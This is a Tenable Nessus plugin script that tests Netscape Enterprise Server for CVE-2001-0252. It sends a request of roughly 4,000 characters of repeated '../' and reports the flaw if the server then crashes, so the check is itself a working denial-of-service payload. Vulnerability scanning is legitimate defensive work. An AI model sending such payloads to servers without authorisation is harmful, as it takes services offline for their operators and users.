#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10689);
  script_version ("$Revision: 1.15 $");
  script_cve_id("CVE-2001-0252");
  script_bugtraq_id(2282);
  script_xref(name:"OSVDB", value:"1739");

  script_name(english:"Netscape Enterprise Server Long Traversal Request Remote DoS");
  script_summary(english:"Attempt to crash the service by sending a long traversal string.");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote server is vulnerable to a denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The remote web server seems to crash when it is issued a too long
request with dots (ie: ../../../../ 1000 times)

An attacker may use this flaw to disable the remote server"
  );

  script_set_attribute(
    attribute:'solution',
    value: "http://www.iplanet.com/support/iws-alert/index.html"
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://marc.info/?l=bugtraq&m=98035833331446&w=2'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();


  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");
  script_dependencie("find_service1.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 banner = get_http_banner(port:port);
 if ( !banner|| "Netscape-Enterprise/" >!< banner ) exit(0);


 soc = http_open_socket(port);
 if(soc)
 {
  req = crap(data:"../", length:4032);
  d = http_get(item:req, port:port);
  send(socket:soc, data:d);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  if(http_is_dead(port:port))security_warning(port);
 }
}
